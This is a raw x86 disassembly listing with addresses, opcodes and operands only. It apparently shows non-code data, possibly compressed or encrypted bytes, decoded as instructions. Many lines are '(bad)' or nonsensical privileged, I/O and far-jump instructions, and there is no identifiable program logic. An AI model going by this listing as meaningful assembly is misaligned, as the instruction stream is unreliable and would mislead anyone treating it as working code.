  417e33:	add    BYTE PTR [edi-0x519271e7],bh
  417e39:	(bad)  
  417e3a:	(bad)  
  417e3b:	(bad)  
  417e3d:	xlat   BYTE PTR ds:[ebx]
  417e3e:	aam    0xef
  417e40:	jns    0x417deb
  417e42:	mov    ds:0x1042c6b,al
  417e47:	add    ch,dh
  417e49:	add    BYTE PTR [eax],al
  417e4b:	add    dl,bl
  417e4d:	xchg   ebp,eax
  417e4e:	pop    es
  417e4f:	je     0x417eac
  417e51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e52:	jbe    0x417e3b
  417e54:	ret    0x633e
  417e57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417e58:	imul   DWORD PTR [ecx]
  417e5a:	jnp    0x417e99
  417e5c:	sbb    BYTE PTR [ecx],0x10
  417e5f:	push   ebx
  417e60:	shl    BYTE PTR [edi+0x2ffd0543],0xc7
  417e67:	adc    al,0x87
  417e69:	in     al,dx
  417e6a:	pop    ecx
  417e6b:	out    dx,al
  417e6c:	outs   dx,BYTE PTR ds:[esi]
  417e6d:	or     BYTE PTR [esi+0x9],dl
  417e70:	into   
  417e71:	dec    edi
  417e72:	xor    BYTE PTR [ebp-0x394a3e9b],dl
  417e78:	cmp    ebp,ebx
  417e7a:	nop    DWORD PTR [eax]
  417e7d:	in     al,0xdb
  417e7f:	fwait
  417e80:	lahf   
  417e81:	mov    edx,ebp
  417e83:	sbb    al,0xb9
  417e85:	and    bl,dl
  417e87:	inc    esp
  417e88:	jbe    0x417ed3
  417e8a:	loopne 0x417eda
  417e8c:	mov    bh,0x5e
  417e8e:	(bad)  
  417e8f:	call   0x54c4:0xe8d73674
  417e96:	les    ebx,FWORD PTR [ecx]
  417e98:	adc    BYTE PTR [ecx],bl
  417e9a:	sbb    eax,0x3bcf499b
  417e9f:	or     DWORD PTR [ecx+eiz*1],esp
  417ea2:	pop    ds
  417ea3:	inc    ebx
  417ea4:	adc    DWORD PTR [edi],ebp
  417ea6:	std    
  417ea7:	push   ebp
  417ea8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417ea9:	(bad)  
  417eaa:	not    DWORD PTR [edi]
  417eac:	(bad)
  417eb0:	jmp    0x5c0f:0xe7975aa0
  417eb7:	and    al,0xfa
  417eb9:	push   ecx
  417eba:	sub    ebx,DWORD PTR [ecx]
  417ebc:	test   al,0x6e
  417ebe:	xchg   edi,esp
  417ec0:	ds pop ebx
  417ec2:	pop    es
  417ec3:	add    eax,0x8cf1fc86
  417ec8:	jb     0x417f37
  417eca:	mov    eax,ds:0x96811ab8
  417ecf:	ja     0x417edb
  417ed1:	call   0x35eb9f2b
  417ed6:	out    0xab,al
  417ed8:	les    ebx,FWORD PTR [edx]
  417eda:	mov    DWORD PTR [edx],edi
  417edc:	mov    ebp,0x5f4dbf6c
  417ee1:	fld    QWORD PTR [edi]
  417ee3:	xchg   DWORD PTR [eax],edx
  417ee5:	sub    BYTE PTR [ebx+edx*2-0x5b],0x89
  417eea:	call   0xab94:0x8714e68f
  417ef1:	adc    DWORD PTR [eax],0xd603ca2e
  417ef7:	cmp    ebx,DWORD PTR [esi]
  417ef9:	sub    dh,ch
  417efb:	pop    eax
  417efc:	ins    BYTE PTR es:[edi],dx
  417efd:	xor    al,0x22
  417eff:	sti    
  417f00:	sbb    edi,0x4e8c23c8
  417f06:	push   esp
  417f07:	inc    eax
  417f08:	xor    al,0x46
  417f0a:	iret   
  417f0b:	push   eax
  417f0c:	rcl    cl,1
  417f0e:	or     al,0x3
  417f10:	fs shl dl,1
  417f13:	fwait
  417f14:	ret    
  417f15:	iret   
  417f16:	pop    edi
  417f17:	(bad)  
  417f18:	sbb    esi,DWORD PTR [ecx]
  417f1a:	push   0xa68af610
  417f1f:	push   es
  417f20:	xchg   ebx,eax
  417f21:	cmp    dl,BYTE PTR [edx+0x5c57fd11]
  417f27:	in     eax,0x3b
  417f29:	inc    ebx
  417f2a:	mov    al,ds:0xac05fc38
  417f2f:	xlat   BYTE PTR ds:[ebx]
  417f30:	fwait
  417f31:	sub    eax,DWORD PTR [edx-0x31]
  417f34:	ja     0x417faf
  417f36:	pop    esp
  417f37:	dec    edx
  417f38:	imul   ebp,ecx,0xa2e2ecf5
  417f3e:	mov    cl,0xd
  417f40:	push   ecx
	...
  417fb1:	add    BYTE PTR [eax],al
  417fb3:	add    BYTE PTR [esi+0x2d],dh
  417fb6:	push   ebp
  417fb7:	inc    ecx
  417fb8:	pop    edi
  417fb9:	jns    0x418031
  417fbb:	aas    
  417fbc:	fisttp DWORD PTR [esi-0x68]
  417fbf:	inc    edx
  417fc0:	adc    ecx,DWORD PTR [eax+0x521f6f7]
  417fc6:	add    DWORD PTR [eax],eax
  417fc8:	cmc    
  417fc9:	add    BYTE PTR [eax],al
  417fcb:	add    BYTE PTR [edx],bl
  417fcd:	stos   DWORD PTR es:[edi],eax
  417fce:	daa    
  417fcf:	lock mov dl,0xe
  417fd2:	and    bh,BYTE PTR [esi]
  417fd4:	test   DWORD PTR [eax-0x72],ecx
  417fd7:	and    BYTE PTR [ecx+eiz*2+0x3f88d7df],0x52
  417fdf:	popa   
  417fe0:	cld    
  417fe1:	fldcw  WORD PTR [eax]
  417fe3:	ss mov esi,edx
  417fe6:	mov    cl,BYTE PTR [edx]
  417fe8:	test   eax,0x6b2979ba
  417fed:	sar    BYTE PTR [eax-0x2cb419e6],cl
  417ff3:	ret    
  417ff4:	jge    0x417f93
  417ff6:	xor    BYTE PTR [edi],ah
  417ff8:	xor    al,0xb8
  417ffa:	sti    
  417ffb:	xor    al,0x7a
  417ffd:	sub    BYTE PTR [esi],ah
  417fff:	test   DWORD PTR [ebp-0x1],ebp
  418002:	ss cmp dl,cl
  418005:	mov    eax,ds:0xfd71ff92
  41800a:	jo     0x41805e
  41800c:	cdq    
  41800d:	mov    ebx,0xa8e61589
  418012:	ss pop es
  418014:	or     cl,dl
  418016:	jnp    0x417ffd
  418018:	inc    edi
  418019:	mov    ecx,DWORD PTR gs:[esi+ebp*8-0x37641e55]
  418021:	dec    edx
  418022:	pusha  
  418023:	pop    esi
  418024:	mov    ecx,0x6cafaec0
  418029:	and    eax,0x793b2253
  41802e:	inc    ebp
  41802f:	lods   al,BYTE PTR ds:[esi]
  418030:	(bad)  
  418031:	rcl    DWORD PTR [ebx-0x46759a85],0x8a
  418038:	ret    
  418039:	inc    esp
  41803a:	add    edi,DWORD PTR [eax+0xb]
  41803d:	mov    bl,0x92
  41803f:	scas   eax,DWORD PTR es:[edi]
  418040:	push   ebx
  418041:	(bad)  
  418042:	(bad)  
  418043:	lds    ebp,FWORD PTR [ecx+0x10]
  418046:	shl    ah,cl
  418048:	(bad)  
  418049:	xchg   edi,eax
  41804a:	mov    WORD PTR [eax],ds
  41804c:	push   edx
  41804d:	cmp    al,0xb0
  41804f:	push   edx
  418050:	adc    eax,0xcd811208
  418055:	jo     0x41805a
  418057:	jmp    0x67bdbb9c
  41805c:	in     eax,dx
  41805d:	jge    0x41806a
  41805f:	add    edx,DWORD PTR [edi-0x5f]
  418062:	fldcw  WORD PTR [ebp+ebx*1-0x4f]
  418066:	cmp    ebp,DWORD PTR [eax+eiz*1]
  418069:	shl    BYTE PTR [eax+0x39eb7b9b],cl
  41806f:	out    0x40,eax
  418071:	jl     0x417ffe
  418073:	jmp    0x27c15178
  418078:	mov    dh,BYTE PTR [edi+0x3da1c975]
  41807e:	cmp    ebp,DWORD PTR [ebx]
  418080:	push   edx
  418081:	push   es
  418082:	jl     0x41802f
  418084:	in     al,dx
  418085:	add    bl,BYTE PTR [ebx-0x872a3cc]
  41808b:	stos   DWORD PTR es:[edi],eax
  41808c:	mov    ah,0x18
  41808e:	mov    eax,0xda2842b0
  418093:	fs mov cs,ebx
  418096:	push   ds
  418097:	(bad)  
  418098:	cmp    DWORD PTR [ebx-0x66a0bdb5],esp
  41809e:	stos   DWORD PTR es:[edi],eax
  41809f:	in     al,0x91
  4180a1:	fisub  DWORD PTR [esp+eiz*4-0x67]
  4180a5:	xchg   dl,bh
  4180a7:	mov    bl,BYTE PTR [edi-0x24]
  4180aa:	or     ebx,eax
  4180ac:	xchg   ecx,eax
  4180ad:	mov    edx,0xb283a046
  4180b2:	mov    bl,0x36
  4180b4:	popf   
  4180b5:	and    dh,BYTE PTR [esp+eiz*8+0x1617f24b]
  4180bc:	shl    DWORD PTR [esi],0xfe
  4180bf:	cmp    al,al
	...
  418131:	add    BYTE PTR [eax],al
  418133:	add    BYTE PTR [esi-0xe58fe7],ah
  418139:	jnp    0x418129
  41813b:	mov    ebp,0xe8ea9e45
  418140:	cmp    al,0x15
  418142:	imul   ebx,DWORD PTR [esi+edx*1-0xafffefa],0xc2000000
  41814d:	cmp    DWORD PTR [ecx-0x2e607adb],eax
  418153:	push   ss
  418154:	pop    ebp
  418155:	scas   al,BYTE PTR es:[edi]
  418156:	ins    DWORD PTR es:[edi],dx
  418157:	mov    DWORD PTR [edi+esi*2+0x40474a3a],esp
  41815e:	inc    ecx
  41815f:	xor    al,0x67
  418161:	stos   DWORD PTR es:[edi],eax
  418162:	rcr    bl,0xa9
  418165:	push   es
  418166:	scas   al,BYTE PTR es:[edi]
  418167:	sub    BYTE PTR ds:0xeca2ff06,0x28
  41816e:	(bad)  
  41816f:	(bad)  
  418170:	cld    
  418171:	lods   al,BYTE PTR ds:[esi]
  418172:	xchg   ebx,eax
  418173:	jno    0x4180fd
  418175:	sti    
  418176:	mul    BYTE PTR [ecx-0x3244e301]
  41817c:	in     eax,0xd7
  41817e:	push   0x6e
  418180:	xor    edi,DWORD PTR [edx]
  418182:	jg     0x4181e9
  418184:	jnp    0x41811c
  418186:	iret   
  418187:	xchg   BYTE PTR [edi+0x7139ffc2],bl
  41818d:	sbb    bl,BYTE PTR [eax*2-0x5e51eb95]
  418194:	cwde   
  418195:	fs fs sbb eax,0x6620b215
  41819c:	shl    BYTE PTR gs:[edi-0x4e2a6fb6],cl
  4181a3:	jmp    0x41814e
  4181a5:	push   esi
  4181a6:	in     eax,0x49
  4181a8:	jae    0x418143
  4181aa:	ds push ebx
  4181ac:	jnp    0x41817b
  4181ae:	cmp    esp,DWORD PTR [esi-0x7b]
  4181b1:	mov    ds:0x699a1c3d,al
  4181b6:	cmp    al,0x55
  4181b8:	ret    
  4181b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4181ba:	addr16 push ss
  4181bc:	aaa    
  4181bd:	cld    
  4181be:	mov    ch,0xd2
  4181c0:	jecxz  0x418179
  4181c2:	in     eax,dx
  4181c3:	sbb    BYTE PTR ds:0x7585ec10,0xed
  4181ca:	loopne 0x41815d
  4181cc:	cmp    DWORD PTR [ebx-0x7972503b],0xffffffde
  4181d3:	xchg   edi,ebx
  4181d5:	push   esp
  4181d6:	or     ebp,DWORD PTR [esi-0x73]
  4181d9:	lods   eax,DWORD PTR ds:[esi]
  4181da:	push   ecx
  4181db:	std    
  4181dc:	cmp    esp,DWORD PTR [eax-0x62032aa]
  4181e2:	(bad)
  4181e6:	xor    DWORD PTR [eax-0x39],edx
  4181e9:	mov    ecx,0x13c2069b
  4181ee:	adc    edi,DWORD PTR [ebp+0x70efb503]
  4181f4:	(bad)  
  4181f5:	inc    ebp
  4181f6:	(bad)  
  4181f8:	pop    edx
  4181f9:	push   edx
  4181fa:	inc    edi
  4181fb:	mov    cl,0x34
  4181fd:	inc    edx
  4181fe:	and    bh,BYTE PTR [ecx+0x5181ea69]
  418204:	jns    0x4181f2
  418206:	enter  0xaf11,0x6e
  41820a:	fs int 0xfe
  41820d:	or     al,0x24
  41820f:	pop    ebp
  418210:	aad    0x79
  418212:	das    
  418213:	cmp    esi,DWORD PTR [esi-0x4f]
  418216:	aas    
  418217:	in     al,0xf8
  418219:	push   0x31
  41821b:	repz aas 
  41821d:	sbb    edx,ecx
  41821f:	push   ebp
  418220:	jl     0x418251
  418222:	clc    
  418223:	ret    0x12b3
  418226:	in     eax,0x3
  418228:	lock pop edi
  41822a:	mov    dh,0xaf
  41822c:	out    0x9f,al
  41822e:	loope  0x41823b
  418230:	arpl   sp,bx
  418232:	mov    WORD PTR [esi],ss
  418234:	fimul  DWORD PTR [edi+0x18203787]
  41823a:	inc    edi
  41823b:	xchg   ebp,eax
  41823c:	mov    al,ds:0xdb3f0c57
	...
  4182b1:	add    BYTE PTR [eax],al
  4182b3:	add    BYTE PTR [ecx-0x44],ch
  4182b6:	xlat   BYTE PTR ds:[ebx]
  4182b7:	pop    esi
  4182b8:	xlat   BYTE PTR ds:[ebx]
  4182b9:	jg     0x4182a4
  4182bb:	mov    edi,0x113ef3ec
  4182c0:	iret   
  4182c1:	dec    ecx
  4182c2:	mov    ebx,0x1070b39
  4182c7:	add    ch,dh
  4182c9:	add    BYTE PTR [eax],al
  4182cb:	add    BYTE PTR [edx+0x48],cl
  4182ce:	dec    ebp
  4182cf:	mov    ecx,0xed5c4ab8
  4182d4:	aaa    
  4182d5:	(bad)  
  4182d6:	mov    al,ds:0x3a9db2af
  4182db:	mov    bl,0xed
  4182dd:	and    eax,ecx
  4182df:	mov    ?,WORD PTR [eax+ebx*1]
  4182e2:	ins    BYTE PTR es:[edi],dx
  4182e3:	add    ah,BYTE PTR [esi-0xe]
  4182e6:	lods   al,BYTE PTR ds:[esi]
  4182e7:	push   edi
  4182e9:	adc    al,0x6e
  4182eb:	in     al,0xf6
  4182ed:	cs add eax,0x965dba7b
  4182f3:	aam    0xe7
  4182f5:	cli    
  4182f6:	xchg   edi,eax
  4182f7:	shl    ch,cl
  4182f9:	jmp    0xb486:0x39ab9a5e
  418300:	mov    eax,0x2611331d
  418306:	sti    
  418307:	dec    edx
  418308:	xchg   esi,eax
  418309:	mov    WORD PTR ds:0x5ce67a7,fs
  41830f:	pop    edi
  418310:	test   cl,ah
  418312:	rcr    BYTE PTR [ebx-0x4b621583],0x8
  418319:	mov    al,ds:0xf6f32f7a
  41831e:	dec    esi
  41831f:	out    0xa8,eax
  418321:	test   al,0x8f
  418323:	adc    eax,0xa4e0e0d6
  418328:	push   ds
  418329:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41832a:	pop    eax
  41832b:	cmc    
  41832c:	jl     0x41832e
  41832e:	cmp    bl,BYTE PTR [edx+0x38]
  418331:	pop    edx
  418332:	leave  
  418333:	out    0x41,eax
  418335:	mov    ebp,0xceef617a
  41833a:	mov    ah,0x26
  41833c:	mov    bl,BYTE PTR [ecx]
  41833e:	push   esp
  41833f:	pusha  
  418340:	fcomp  QWORD PTR [esi-0x2d7cb0bf]
  418346:	pop    ds
  418347:	ins    BYTE PTR es:[edi],dx
  418348:	das    
  418349:	outs   dx,DWORD PTR cs:[esi]
  41834b:	xchg   DWORD PTR [esi],edx
  41834d:	pop    esp
  41834e:	or     DWORD PTR [ebx],esp
  418350:	les    esi,FWORD PTR [esi+0x56]
  418353:	dec    esp
  418354:	sub    ebx,ebx
  418356:	pusha  
  418357:	lar    ebp,WORD PTR [edi+0x414b94f0]
  41835e:	in     eax,dx
  41835f:	mov    eax,0xb61bb32f
  418364:	push   es
  418365:	ror    ch,1
  418367:	sub    al,0x47
  418369:	lods   eax,DWORD PTR ds:[esi]
  41836a:	or     cl,0xd4
  41836d:	scas   al,BYTE PTR es:[edi]
  41836e:	lea    edi,[eax+0x68]
  418371:	in     al,0x27
  418373:	cwde   
  418374:	rcr    BYTE PTR [edx+ecx*8],0x46
  418378:	dec    BYTE PTR [ebp+0x9]
  41837b:	inc    ebp
  41837c:	add    ch,BYTE PTR [eax]
  41837e:	fstp   DWORD PTR [esi]
  418380:	shl    bh,cl
  418382:	neg    DWORD PTR ds:0x9342af9b
  418388:	(bad)  
  418389:	xor    dl,ch
  41838b:	cmc    
  41838c:	push   edi
  41838d:	pop    ds
  41838e:	lods   al,BYTE PTR ds:[esi]
  41838f:	pusha  
  418390:	lsl    edx,WORD PTR [esi-0x32]
  418394:	dec    ebx
  418395:	inc    edi
  418396:	pop    ebx
  418397:	xchg   ebp,eax
  418398:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418399:	aas    
  41839a:	ret    
  41839b:	inc    edx
  41839c:	cmc    
  41839d:	js     0x4183af
  41839f:	shl    dl,0x24
  4183a2:	dec    edi
  4183a3:	jnp    0x4183de
  4183a5:	mov    edi,0x7a61b32e
  4183aa:	mov    DWORD PTR [esp+eiz*2+0x4b5f7bd7],ecx
  4183b1:	jbe    0x4183d6
  4183b3:	test   BYTE PTR [esi],ch
  4183b5:	int    0xcd
  4183b7:	jmp    0x418432
  4183b9:	dec    eax
  4183ba:	out    0x9,al
  4183bc:	sbb    eax,0x241a844c
	...
  418431:	add    BYTE PTR [eax],al
  418433:	add    BYTE PTR [ecx+0x6b0c6aba],dl
  418439:	fdivr  st(7),st
  41843b:	mov    edi,0xdccd8f2d
  418440:	(bad)  
  418441:	repz xchg ebp,eax
  418443:	xor    BYTE PTR [eax],al
  418445:	or     BYTE PTR [ecx],al
  418447:	add    ch,dh
  418449:	add    BYTE PTR [eax],al
  41844b:	add    BYTE PTR [eax-0x519794c1],ch
  418451:	cmovns ebp,DWORD PTR [edi]
  418454:	xchg   DWORD PTR [edx],ecx
  418456:	or     eax,DWORD PTR ds:0xf8b69e38
  41845c:	daa    
  41845d:	jno    0x418496
  41845f:	iret   
  418460:	ror    al,1
  418462:	outs   dx,BYTE PTR ds:[esi]
  418463:	test   eax,0xb2b3ac06
  418468:	cmc    
  418469:	rol    BYTE PTR [eax-0x25ad0734],0x4e
  418470:	sub    al,0x19
  418472:	in     eax,dx
  418473:	out    dx,eax
  418474:	pop    ebp
  418475:	cmp    BYTE PTR [esi+0x6b80ba55],0x2a
  41847c:	mov    bl,0x8e
  41847e:	mov    ah,0xb1
  418480:	stos   BYTE PTR es:[edi],al
  418481:	retf   0x206d
  418484:	add    BYTE PTR [ecx-0x480a440b],bl
  41848a:	push   es
  41848b:	sub    DWORD PTR [ecx-0x3b37f083],0x2b
  418492:	dec    ebx
  418493:	aaa    
  418494:	push   eax
  418495:	mov    ah,0xfd
  418497:	fadd   DWORD PTR [eax+0x5d]
  41849a:	(bad)  
  41849b:	jmp    0xf424af01
  4184a0:	dec    eax
  4184a1:	pop    esp
  4184a2:	cld    
  4184a3:	push   edx
  4184a4:	jl     0x4184e0
  4184a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4184a7:	inc    esi
  4184a8:	adc    ecx,ebp
  4184aa:	mov    ebp,DWORD PTR [ecx-0x62]
  4184ad:	aad    0xe3
  4184af:	cmp    BYTE PTR [eax+0x4b8f7bcc],bl
  4184b5:	mov    esi,0x74749fe7
  4184ba:	inc    esp
  4184bb:	sub    DWORD PTR [eax+0x5],ecx
  4184be:	xchg   edi,eax
  4184bf:	mov    ebp,0x16387e98
  4184c4:	xor    al,0x23
  4184c6:	xor    DWORD PTR [ebx+0x54d60dc1],ebx
  4184cc:	shl    DWORD PTR [ecx-0x62617165],cl
  4184d2:	loopne 0x418533
  4184d4:	dec    ebx
  4184d5:	jmp    0xea77:0x630eb467
  4184dc:	retf   
  4184dd:	mov    ecx,0x80c90833
  4184e2:	mov    BYTE PTR [esi+0x5c],al
  4184e5:	scas   eax,DWORD PTR es:[edi]
  4184e6:	xchg   ebp,eax
  4184e7:	aad    0x74
  4184e9:	mov    cl,BYTE PTR [ebx]
  4184eb:	pop    eax
  4184ec:	enter  0xe3ba,0xe8
  4184f0:	js     0x418526
  4184f2:	mov    WORD PTR [ebx+0x46],ds
  4184f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4184f6:	dec    edi
  4184f7:	ret    0x6ac
  4184fa:	or     bh,ch
  4184fc:	and    al,0x6b
  4184fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4184ff:	test   eax,0xc3fb6b5b
  418504:	push   cs
  418505:	xor    DWORD PTR [eax+0x48],esi
  418508:	(bad)  
  418509:	rcl    BYTE PTR [eax+0x74],cl
  41850c:	sub    esi,DWORD PTR [edx-0x47a30e88]
  418512:	(bad)  
  418513:	pop    eax
  418514:	cmp    eax,0x85c08d7f
  418519:	dec    esp
  41851a:	cmc    
  41851b:	xchg   ebx,eax
  41851c:	xor    al,0x54
  41851e:	aad    0x3f
  418520:	push   ds
  418521:	es scas eax,DWORD PTR es:[edi]
  418523:	dec    ebp
  418524:	psubw  mm7,mm4
  418527:	dec    ebp
  418528:	adc    eax,0xfaf69dfb
  41852d:	popa   
  41852e:	retf   
  41852f:	inc    edi
  418530:	pushf  
  418531:	aaa    
  418532:	shl    BYTE PTR [ecx+0x101bc825],1
  418538:	les    esp,FWORD PTR [ebx-0x5b958b9f]
  41853e:	cdq    
  41853f:	jnp    0x41854c
	...
  4185b1:	add    BYTE PTR [eax],al
  4185b3:	add    BYTE PTR [ecx-0x20b02c99],ch
  4185b9:	(bad)  
  4185ba:	mov    ebp,0x15c03be7
  4185bf:	stc    
  4185c0:	out    0x4b,al
  4185c2:	hlt    
  4185c3:	sbb    al,0xf5
  4185c5:	or     BYTE PTR [ecx],al
  4185c7:	add    ch,dh
  4185c9:	add    BYTE PTR [eax],al
  4185cb:	add    BYTE PTR [edx+0x4a46fceb],dh
  4185d1:	lahf   
  4185d2:	cmp    DWORD PTR [edx],eax
  4185d4:	call   0x9738:0x5450d94d
  4185db:	out    dx,eax
  4185dc:	jg     0x418632
  4185de:	mov    eax,ds:0x85f53f33
  4185e3:	mov    esp,0x24a324a
  4185e8:	shr    BYTE PTR [edx+0x3],1
  4185eb:	or     al,0xde
  4185ed:	shl    dh,1
  4185ef:	(bad)  
  4185f0:	in     eax,dx
  4185f1:	add    bh,BYTE PTR [edi+0x14]
  4185f4:	push   ds
  4185f5:	mov    BYTE PTR [edx+0xd],bh
  4185f8:	mov    eax,ds:0xea1bfcb3
  4185fd:	shl    DWORD PTR [esi],1
  4185ff:	sbb    eax,0x6fe3b7d1
  418604:	repz add eax,0x9cb81112
  41860a:	loope  0x4185e3
  41860c:	cmp    DWORD PTR ds:0xa907f864,edx
  418612:	pop    esi
  418613:	je     0x4185f4
  418615:	scas   al,BYTE PTR es:[edi]
  418616:	push   0x8003e7c1
  41861b:	mov    edi,0x5bc1c811
  418620:	mov    ah,0xfa
  418622:	push   ebp
  418623:	sub    eax,0xfa8fa903
  418628:	into   
  418629:	ds mov cl,0x65
  41862c:	pop    ds
  41862d:	xor    esp,DWORD PTR [ebx]
  41862f:	in     al,dx
  418630:	dec    ebx
  418631:	rol    DWORD PTR [ebx+0x5a],0x63
  418635:	or     ah,BYTE PTR [ebx*4-0x2931f9c4]
  41863c:	aad    0xe8
  41863e:	jp     0x4186a5
  418640:	xchg   cl,ah
  418642:	lahf   
  418643:	in     eax,dx
  418644:	lods   al,BYTE PTR ds:[esi]
  418645:	adc    cl,ch
  418647:	jns    0x418625
  418649:	inc    eax
  41864a:	lock mov ebp,0x97442405
  418650:	pop    ecx
  418651:	loopne 0x4185ef
  418653:	xor    al,0xf8
  418655:	ds inc eax
  418657:	push   eax
  418658:	(bad)  
  418659:	ins    BYTE PTR es:[edi],dx
  41865a:	xor    eax,DWORD PTR [edi]
  41865c:	sysenter 
  41865e:	pop    ecx
  41865f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418660:	pop    ebp
  418661:	popf   
  418662:	(bad)
  418665:	push   es
  418666:	ins    BYTE PTR es:[edi],dx
  418667:	xor    al,0x97
  418669:	ds stos DWORD PTR es:[edi],eax
  41866b:	enter  0xb63b,0x4e
  41866f:	or     esp,DWORD PTR [ebx-0x56ede073]
  418675:	test   BYTE PTR [edx],al
  418677:	dec    esi
  418678:	add    ch,BYTE PTR [ebx+0x0]
  41867b:	mov    esp,0xc74119dc
  418680:	add    DWORD PTR [esi+edx*8],ecx
  418683:	mov    eax,0x57d4a3c3
  418688:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418689:	sar    DWORD PTR [ecx],0xd6
  41868c:	or     dl,BYTE PTR [ebx+ecx*4-0x5cf64f95]
  418693:	push   0xefd1c345
  418698:	adc    ah,BYTE PTR [ecx+edi*1-0x4a]
  41869c:	out    0x2a,eax
  41869e:	mov    ecx,0x98ae2b46
  4186a3:	xchg   edi,eax
  4186a4:	fbld   TBYTE PTR [edx-0x56]
  4186a7:	daa    
  4186a8:	inc    edx
  4186a9:	adc    DWORD PTR [edx+0x38],0x255a2fdc
  4186b0:	pop    ds
  4186b1:	sbb    DWORD PTR [ebx-0x5dd33fec],0x79d291df
  4186bb:	inc    ecx
  4186bc:	pop    esi
  4186bd:	test   al,0x2c
  4186bf:	push   edx
  4186c0:	jae    0x4186c2
	...
  418732:	add    BYTE PTR [eax],al
  418734:	jmp    0xff598547
  418739:	imul   ecx
  41873b:	(bad)  
  41873c:	pop    ds
  41873d:	sub    ah,0x2b
  418740:	sbb    bl,0x9d
  418743:	mov    esi,0x109ea
  418748:	cmc    
  418749:	add    BYTE PTR [eax],al
  41874b:	add    BYTE PTR [eax],ch
  41874d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41874e:	pop    es
  41874f:	les    ebp,FWORD PTR [edi+0x52ae0b3e]
  418755:	cmp    edi,DWORD PTR [ebp-0x24f80c62]
  41875b:	xlat   BYTE PTR ds:[ebx]
  41875c:	pop    es
  41875d:	stos   BYTE PTR es:[edi],al
  41875e:	sar    BYTE PTR [edx+edi*8+0x11],1
  418762:	mov    eax,ds:0xb8ec7e48
  418767:	mov    eax,ds:0xe52fe2ed
  41876c:	stos   BYTE PTR es:[edi],al
  41876d:	inc    esi
  41876e:	jecxz  0x41873f
  418770:	sti    
  418771:	loope  0x418700
  418773:	or     edi,DWORD PTR [ecx-0x75fa5460]
  418779:	dec    esp
  41877a:	aaa    
  41877b:	sub    ah,0x5a
  41877e:	mov    esp,ecx
  418780:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418781:	inc    esi
  418782:	frstor [esi+ecx*4]
  418785:	fld    QWORD PTR ds:0xd784a2d8
  41878b:	jbe    0x41873f
  41878d:	mov    eax,0xa388a211
  418792:	call   0x78d7:0xe46f5283
  418799:	dec    ebp
  41879a:	and    edx,DWORD PTR [esi+0x74]
  41879d:	sub    DWORD PTR [eax+0x1a],edi
  4187a0:	mov    esp,DWORD PTR ds:0xc82309fd
  4187a6:	or     eax,0xfa978b9b
  4187ab:	gs pop ds
  4187ad:	push   ebx
  4187ae:	xor    ch,bh
  4187b0:	jp     0x4187b1
  4187b2:	or     al,0xc8
  4187b4:	inc    ebp
  4187b5:	jg     0x418830
  4187b7:	lahf   
  4187b8:	adc    al,0x8c
  4187ba:	imul   esi,ebp,0x395fba30
  4187c0:	sbb    al,0xca
  4187c2:	push   es
  4187c3:	cli    
  4187c4:	mov    ecx,DWORD PTR [ebx+0x45]
  4187c7:	sbb    al,0xfd
  4187c9:	test   BYTE PTR [ebp-0x7feb086d],0xf2
  4187d0:	cmc    
  4187d1:	inc    esp
  4187d2:	mov    ds:0xa0b948cb,al
  4187d7:	test   DWORD PTR ds:0xb49e7c90,0xa1ef6867
  4187e1:	aam    0x6e
  4187e3:	xlat   BYTE PTR ds:[ebx]
  4187e4:	(bad)  
  4187e5:	adc    BYTE PTR [eax],0xd0
  4187e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4187e9:	pop    edx
  4187ea:	push   edx
  4187eb:	adc    al,0xb
  4187ed:	fild   WORD PTR [esi+0xc983766]
  4187f3:	sbb    esp,DWORD PTR [eax+eax*2-0x49]
  4187f7:	jne    0x418869
  4187f9:	js     0x4187ad
  4187fb:	sub    al,0x13
  4187fd:	dec    edi
  4187fe:	rcr    DWORD PTR [ebx-0x72],cl
  418801:	push   edx
  418802:	jns    0x4187bb
  418804:	jle    0x418829
  418806:	out    0x5d,al
  418808:	aaa    
  418809:	add    dh,bl
  41880b:	hlt    
  41880c:	mov    ah,0xae
  41880e:	out    dx,eax
  41880f:	or     al,0x25
  418811:	jecxz  0x4187aa
  418813:	or     al,0xee
  418815:	ret    0xccff
  418818:	inc    eax
  418819:	pushf  
  41881a:	jbe    0x41887e
  41881c:	mov    bh,0xe5
  41881e:	clc    
  41881f:	fisubr WORD PTR [eax-0x5705cc36]
  418825:	jmp    0x41887c
  418827:	and    eax,0x3b3bed8d
  41882c:	mov    cl,0x4
  41882e:	add    al,0x82
  418830:	jl     0x418886
  418832:	cdq    
  418833:	ret    0x5a5f
  418836:	xor    BYTE PTR [ecx+0x28f41bbb],0x37
  41883d:	test   eax,0x614fee
	...
  4188b2:	add    BYTE PTR [eax],al
  4188b4:	pop    eax
  4188b5:	inc    ecx
  4188b6:	pop    ds
  4188b7:	lods   eax,DWORD PTR ds:[esi]
  4188b8:	pop    ds
  4188b9:	(bad)  
  4188ba:	cli    
  4188bb:	cmc    
  4188bc:	inc    ebx
  4188bd:	mov    ss:0x18d30c32,al
  4188c3:	repnz fisttp WORD PTR [edx]
  4188c6:	add    DWORD PTR [eax],eax
  4188c8:	cmc    
  4188c9:	add    BYTE PTR [eax],al
  4188cb:	add    BYTE PTR [esi-0x56],dl
  4188ce:	lahf   
  4188cf:	out    dx,eax
  4188d0:	mov    ds:0x573aadb0,eax
  4188d5:	maxps  xmm3,XMMWORD PTR [ebx]
  4188d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4188d9:	jb     0x418907
  4188db:	(bad)  [ebx]
  4188dd:	int3   
  4188de:	iret   
  4188df:	repz in al,0xb5
  4188e2:	dec    ecx
  4188e3:	cmp    DWORD PTR [esp+ebp*1-0x13],esp
  4188e7:	cmc    
  4188e8:	or     al,BYTE PTR [ebx+0x410f10f0]
